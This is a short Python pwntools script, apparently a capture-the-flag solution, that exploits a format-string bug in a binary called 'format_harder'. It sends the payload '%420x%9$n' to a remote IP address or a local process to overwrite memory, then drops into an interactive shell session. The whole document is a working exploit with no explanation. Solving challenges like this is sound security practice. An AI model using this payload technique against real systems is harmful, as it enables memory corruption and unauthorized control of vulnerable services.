from pwn import *

if len(sys.argv) >1:
	sh=remote("128.199.104.41",42069)
else:
	sh=process("./format_harder")


p='%{}x%9$n'.format(420)
sh.sendline(p)

sh.interactive()